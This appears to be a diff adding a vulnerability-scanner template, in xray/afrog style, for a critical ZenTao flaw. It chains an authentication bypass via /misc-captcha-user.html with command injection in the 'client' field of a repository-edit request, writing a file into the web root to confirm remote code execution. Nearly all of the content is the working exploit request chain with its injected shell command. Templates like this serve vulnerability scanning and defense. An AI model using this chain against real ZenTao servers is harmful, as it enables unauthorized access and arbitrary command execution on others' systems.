@@ -1,0 +1,42 @@
+id: zentao-misc-captcha-user-auth-bypass-to-rce
+
+info:
+  name: zentao misc-captcha-user auth bypass to rce
+  author: sw0rd
+  severity: critical
+  verified: true
+  description: |
+    禅道系统misc-captcha-user.html权限绕过与后台命令执行
+  reference:
+    - https://www.zhihu.com/tardis/zm/art/622050639?source_id=1003
+  tags: zentao,rce,bypass
+  created: 2023/07/13
+
+set:
+  randstr: randomLowercase(10)
+  md5: md5(randstr)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /misc-captcha-user.html
+      headers:
+        Cookie: zentaosid=a6ca41962cae417054d9c9ccdb736f36; lang=zh-cn; device=desktop; theme=default; windowWidth=1344; windowHeight=687
+    expression: response.status == 200
+  r1:
+    request:
+      method: POST
+      path: /repo-edit-10000-10000.html
+      headers:
+        Cookie: zentaosid=a6ca41962cae417054d9c9ccdb736f36; lang=zh-cn; device=desktop; theme=default; windowWidth=1344; windowHeight=687
+      body: |
+        SCM=Subversion&client=echo {{md5}}// > ../../www/{{randstr}}.txt -- 
+    expression: response.status == 200
+  r2:
+    request:
+      method: GET
+      headers:
+        Cookie: zentaosid=a6ca41962cae417054d9c9ccdb736f36; lang=zh-cn; device=desktop; theme=default; windowWidth=1344; windowHeight=687
+      path: /{{randstr}}.txt
+    expression: response.body.bcontains(bytes(md5))
+expression: r0() && r1() && r2()
